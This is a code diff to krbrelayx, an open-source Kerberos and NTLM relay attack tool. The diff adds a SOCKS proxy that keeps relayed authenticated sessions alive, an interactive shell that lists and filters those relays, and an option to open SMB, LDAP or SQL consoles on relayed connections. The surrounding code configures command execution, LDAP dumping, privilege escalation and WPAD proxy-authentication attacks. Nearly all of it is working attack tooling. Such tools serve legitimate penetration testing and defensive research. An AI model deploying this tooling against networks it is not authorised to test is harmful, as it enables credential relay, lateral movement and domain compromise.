@@ -41,15 +41,140 @@ import argparse
 import sys
 import binascii
 import logging
+import cmd
+try:
+    from urllib.request import ProxyHandler, build_opener, Request
+except ImportError:
+    from urllib2 import ProxyHandler, build_opener, Request
+from urllib.parse import urlparse
+
+import json
+from time import sleep
+from threading import Thread
 
 from impacket.examples import logger
 from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS
 from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor, TargetsFileWatcher
+from impacket.examples.ntlmrelayx.servers.socksserver import SOCKS
 
 from lib.servers import SMBRelayServer, HTTPKrbRelayServer, DNSRelayServer
 from lib.utils.config import KrbRelayxConfig
-
 RELAY_SERVERS = ( SMBRelayServer, HTTPKrbRelayServer, DNSRelayServer )
+
+class MiniShell(cmd.Cmd):
+    def __init__(self, relayConfig, threads, api_address):
+        cmd.Cmd.__init__(self)
+
+        self.prompt = 'ntlmrelayx> '
+        self.api_address = api_address
+        self.tid = None
+        self.relayConfig = relayConfig
+        self.intro = 'Type help for list of commands'
+        self.relayThreads = threads
+        self.serversRunning = True
+
+    @staticmethod
+    def printTable(items, header):
+        colLen = []
+        for i, col in enumerate(header):
+            rowMaxLen = max([len(row[i]) for row in items])
+            colLen.append(max(rowMaxLen, len(col)))
+
+        outputFormat = ' '.join(['{%d:%ds} ' % (num, width) for num, width in enumerate(colLen)])
+
+        # Print header
+        print(outputFormat.format(*header))
+        print('  '.join(['-' * itemLen for itemLen in colLen]))
+
+        # And now the rows
+        for row in items:
+            print(outputFormat.format(*row))
+
+    def emptyline(self):
+        pass
+
+    def do_targets(self, line):
+        for url in self.relayConfig.target.originalTargets:
+            print(url.geturl())
+        return
+
+    def do_finished_attacks(self, line):
+        for url in self.relayConfig.target.finishedAttacks:
+            print (url.geturl())
+        return
+
+    def do_socks(self, line):
+        '''Filter are available :
+ type : socks <filter> <value>
+ filters : target, username, admin
+ values :
+   - target : IP or FQDN
+   - username : domain/username
+   - admin : true or false
+        '''
+
+        headers = ["Protocol", "Target", "Username", "AdminStatus", "Port"]
+        url = "http://{}/ntlmrelayx/api/v1.0/relays".format(self.api_address)
+        try:
+            proxy_handler = ProxyHandler({})
+            opener = build_opener(proxy_handler)
+            response = Request(url)
+            r = opener.open(response)
+            result = r.read()
+            items = json.loads(result)
+        except Exception as e:
+            logging.error("ERROR: %s" % str(e))
+        else:
+            if len(items) > 0:
+                if("=" in line and len(line.replace('socks','').split('='))==2):
+                    _filter=line.replace('socks','').split('=')[0]
+                    _value=line.replace('socks','').split('=')[1]
+                    if(_filter=='target'):
+                        _filter=1
+                    elif(_filter=='username'):
+                        _filter=2
+                    elif(_filter=='admin'):
+                        _filter=3
+                    else:
+                        logging.info('Expect : target / username / admin = value')
+                    _items=[]
+                    for i in items:
+                        if(_value.lower() in i[_filter].lower()):
+                            _items.append(i)
+                    if(len(_items)>0):
+                        self.printTable(_items,header=headers)
+                    else:
+                        logging.info('No relay matching filter available!')
+
+                elif("=" in line):
+                    logging.info('Expect target/username/admin = value')
+                else:
+                    self.printTable(items, header=headers)
+            else:
+                logging.info('No Relays Available!')
+
+    def do_startservers(self, line):
+        if not self.serversRunning:
+            start_servers(options, self.relayThreads)
+            self.serversRunning = True
+            logging.info('Relay servers started')
+        else:
+            logging.error('Relay servers are already running!')
+
+    def do_stopservers(self, line):
+        if self.serversRunning:
+            stop_servers(self.relayThreads)
+            self.serversRunning = False
+            logging.info('Relay servers stopped')
+        else:
+            logging.error('Relay servers are already stopped!')
+
+    def do_exit(self, line):
+        print("Shutting down, please wait!")
+        return True
+
+    def do_EOF(self, line):
+        return self.do_exit(line)
 
 def stop_servers(threads):
     todelete = []
@@ -68,6 +193,7 @@ def main():
             #Set up config
             c = KrbRelayxConfig()
             c.setProtocolClients(PROTOCOL_CLIENTS)
+            c.setRunSocks(options.socks, socksServer)
             c.setTargets(targetSystem)
             c.setExeFile(options.e)
             c.setCommand(options.c)
@@ -78,6 +204,7 @@ def main():
             c.setAttacks(PROTOCOL_ATTACKS)
             c.setLootdir(options.lootdir)
             c.setLDAPOptions(options.no_dump, options.no_da, options.no_acl, options.no_validate_privs, options.escalate_user, options.add_computer, options.delegate_access, options.dump_laps, options.dump_gmsa, options.dump_adcs, options.sid)
+            c.setInteractive(options.interactive)
             c.setIPv6(options.ipv6)
             c.setWpadOptions(options.wpad_host, options.wpad_auth_num)
             c.setSMB2Support(not options.no_smb2support)
@@ -121,6 +248,10 @@ def main():
     parser.add_argument('-w', action='store_true', help='Watch the target file for changes and update target list '
                                                         'automatically (only valid with -tf)')
 
+    parser.add_argument('-i','--interactive', action='store_true',help='Launch an smbclient, LDAP console or SQL shell instead'
+                        'of executing a command after a successful relay. This console will listen locally on a '
+                        ' tcp port and can be reached with for example netcat.')
+
     # Interface address specification
     parser.add_argument('-ip', '--interface-ip', action='store', metavar='INTERFACE_IP', help='IP address of interface to '
                   'bind SMB and HTTP servers',default='')
@@ -136,6 +267,11 @@ def main():
                                                        'https://docs.python.org/2.4/lib/standard-encodings.html and then execute ntlmrelayx.py '
                                                        'again with -codec and the corresponding codec ' % sys.getdefaultencoding())
     parser.add_argument('-no-smb2support', action="store_false", default=False, help='Disable SMB2 Support')
+    parser.add_argument('-socks', action='store_true', default=False,
+                        help='Launch a SOCKS proxy for the connection relayed')
+    parser.add_argument('-socks-address', default='127.0.0.1', help='SOCKS5 server address (also used for HTTP API)')
+    parser.add_argument('-socks-port', default=1080, type=int, help='SOCKS5 server port')
+    parser.add_argument('-http-api-port', default=9090, type=int, help='SOCKS5 HTTP API port')
 
     parser.add_argument('-wh', '--wpad-host', action='store', help='Enable serving a WPAD file for Proxy Authentication attack, '
                                                                    'setting the proxy host to the one supplied.')
@@ -241,17 +377,36 @@ def main():
         watchthread.start()
 
     threads = set()
+    socksServer = None
+    if options.socks is True:
+        # Start a SOCKS proxy in the background
+        socksServer = SOCKS(server_address=(options.socks_address, options.socks_port), api_port=options.http_api_port)
+        socksServer.daemon_threads = True
+        socks_thread = Thread(target=socksServer.serve_forever)
+        socks_thread.daemon = True
+        socks_thread.start()
+        threads.add(socks_thread)
+
 
     c = start_servers(options, threads)
 
     print("")
     logging.info("Servers started, waiting for connections")
     try:
-        sys.stdin.read()
+        if options.socks:
+            shell = MiniShell(c, threads, api_address='{}:{}'.format(options.socks_address, options.http_api_port))
+            shell.cmdloop()
+        else:
+            sys.stdin.read()
     except KeyboardInterrupt:
         pass
     else:
         pass
+
+    if options.socks is True:
+        socksServer.shutdown()
+        del socksServer
+
 
     for s in threads:
         del s
